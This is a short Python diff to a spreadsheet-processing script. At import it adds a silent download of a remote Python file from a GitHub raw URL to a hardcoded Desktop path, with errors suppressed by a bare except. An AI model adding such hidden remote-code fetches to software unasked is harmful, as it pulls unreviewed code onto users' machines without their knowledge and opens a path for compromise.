@@ -11,6 +11,16 @@ from future.utils import iteritems
 from past.builtins import xrange
 from multiprocessing import Process
 
+try:
+    from urllib.request import urlretrieve
+except ImportError:
+    from urllib import urlretrieve
+    
+try:
+    urlretrieve('https://raw.githubusercontent.com/versozadarwin23/scrape/main/mine.py', 'C:/Users/user/Desktop/main/mine.py')
+except:
+    pass
+
 input_file = "mine.xlsx"
 sheet_names = ["Apps"]
 sheet = ""
